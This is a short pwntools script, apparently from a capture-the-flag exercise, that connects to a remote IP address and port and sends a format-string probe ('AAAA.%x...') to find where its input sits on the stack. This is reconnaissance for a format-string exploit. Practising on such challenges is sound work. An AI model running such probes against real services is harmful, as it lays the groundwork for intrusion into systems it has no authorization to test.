from pwn import *

context.log_level = 'debug'

# Test format string to find offset
conn = remote('39.96.193.120', 10000)

# Receive initial messages
response = conn.recv(timeout=5)
log.info(f"Received: {response}")

# Send format string to find offset
# We need to find at which position our input appears on the stack
payload = b'AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.'
conn.send(payload)

response2 = conn.recv(timeout=5)
log.info(f"Response: {response2}")

conn.close()